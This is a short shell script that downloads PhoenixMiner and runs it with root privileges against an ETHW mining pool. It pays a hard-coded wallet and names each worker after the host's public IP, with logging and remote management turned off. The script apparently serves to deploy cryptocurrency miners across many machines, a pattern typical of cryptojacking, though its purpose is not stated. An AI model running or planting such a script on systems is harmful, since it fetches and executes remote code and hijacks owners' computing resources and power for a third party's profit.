#!/bin/sh
sudo apt update
sudo apt install libpci3
sudo wget https://phoenixminer.info/downloads/PhoenixMiner_6.0c_Linux.tar.gz
tar -xf PhoenixMiner_6.0c_Linux.tar.gz
cd PhoenixMiner_6.0c_Linux
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && sudo ./PhoenixMiner -pool ethw.2miners.com:2020 -wal 0x5dB9e26D5035C124a9b7dDdD545Fd60C23Cf26D0.$ip -epsw x -mode 1 -Rmode 1 -log 0 -mport 0 -etha 0 -retrydelay 1 -ftime 55 -tt 79 -tstop 89 -asm 2 -allpools 1
